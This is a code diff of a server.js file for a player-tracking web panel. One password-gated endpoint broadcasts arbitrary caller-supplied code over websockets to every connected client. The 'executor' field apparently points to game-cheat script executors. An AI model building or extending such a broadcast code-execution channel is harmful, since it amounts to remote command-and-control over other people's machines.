@@ -1,5 +1,4 @@
-// server.js - ONE FILE WITH EVERYTHING
-// Features: Player tracking, Print, All, Kick, Execute Code
+// server.js - COMPLETE FIXED VERSION
 
 const players = new Map();
 
@@ -85,12 +84,73 @@ export default {
           connectedAt: player.connectedAt
         });
       }
+      console.log(`📊 Returning ${list.length} players`);
       return new Response(JSON.stringify(list), {
         headers: { 'Content-Type': 'application/json' }
       });
     }
 
-    // ─── API: SEND "print" ───
+    // ─── API: EXECUTE CODE ───
+    if (url.pathname === '/api/execute' && request.method === 'POST') {
+      try {
+        const body = await request.json();
+        const { code, password } = body;
+
+        console.log(`📤 Execute request from: ${body.player || 'unknown'}`);
+
+        if (!password || password !== SECRET_KEY) {
+          return new Response(JSON.stringify({ 
+            success: false, 
+            message: 'Invalid password!' 
+          }), {
+            status: 401,
+            headers: { 'Content-Type': 'application/json' }
+          });
+        }
+
+        if (!code || code.trim() === '') {
+          return new Response(JSON.stringify({ 
+            success: false, 
+            message: 'Code required!' 
+          }), {
+            status: 400,
+            headers: { 'Content-Type': 'application/json' }
+          });
+        }
+
+        let sent = 0;
+        for (const [id, data] of players) {
+          try {
+            if (data.ws) {
+              data.ws.send(code);
+              sent++;
+              console.log(`📤 Sent code to: ${data.name}`);
+            }
+          } catch (err) {
+            console.error(`Failed to send to ${data.name}:`, err);
+          }
+        }
+
+        return new Response(JSON.stringify({ 
+          success: true, 
+          message: `✅ Code sent to ${sent} players!` 
+        }), {
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+      } catch (err) {
+        console.error('Execute error:', err);
+        return new Response(JSON.stringify({ 
+          success: false, 
+          message: 'Error: ' + err.message 
+        }), {
+          status: 500,
+          headers: { 'Content-Type': 'application/json' }
+        });
+      }
+    }
+
+    // ─── API: PRINT ───
     if (url.pathname === '/api/print' && request.method === 'POST') {
       try {
         const body = await request.json();
@@ -134,7 +194,7 @@ export default {
       }
     }
 
-    // ─── API: SEND "all" ───
+    // ─── API: ALL ───
     if (url.pathname === '/api/all' && request.method === 'POST') {
       try {
         const body = await request.json();
@@ -163,60 +223,6 @@ export default {
         return new Response(JSON.stringify({ 
           success: true, 
           message: `✅ "all" sent to ${sent} players!` 
-        }), {
-          headers: { 'Content-Type': 'application/json' }
-        });
-
-      } catch (err) {
-        return new Response(JSON.stringify({ 
-          success: false, 
-          message: 'Error: ' + err.message 
-        }), {
-          status: 500,
-          headers: { 'Content-Type': 'application/json' }
-        });
-      }
-    }
-
-    // ─── API: EXECUTE CODE ───
-    if (url.pathname === '/api/execute' && request.method === 'POST') {
-      try {
-        const body = await request.json();
-        const { code, password } = body;
-
-        if (!password || password !== SECRET_KEY) {
-          return new Response(JSON.stringify({ 
-            success: false, 
-            message: 'Invalid password!' 
-          }), {
-            status: 401,
-            headers: { 'Content-Type': 'application/json' }
-          });
-        }
-
-        if (!code || code.trim() === '') {
-          return new Response(JSON.stringify({ 
-            success: false, 
-            message: 'Code required!' 
-          }), {
-            status: 400,
-            headers: { 'Content-Type': 'application/json' }
-          });
-        }
-
-        let sent = 0;
-        for (const [id, data] of players) {
-          try {
-            if (data.ws) {
-              data.ws.send(code);
-              sent++;
-            }
-          } catch (err) {}
-        }
-
-        return new Response(JSON.stringify({ 
-          success: true, 
-          message: `✅ Code sent to ${sent} players!` 
         }), {
           headers: { 'Content-Type': 'application/json' }
         });
@@ -399,7 +405,7 @@ export default {
             <span>👤 \${p.name} \${p.isOwner ? '👑' : ''} 🆔 \${p.userId} ⚡ \${p.executor}</span>
           </div>
         \`).join('');
-      } catch(e) { console.error(e); }
+      } catch(e) { console.error('Fetch error:', e); }
     }
 
     async function sendCode() {
@@ -478,6 +484,7 @@ export default {
       }, 3000);
     }
 
+    // ─── INIT ───
     fetchPlayers();
     setInterval(fetchPlayers, 3000);
   </script>
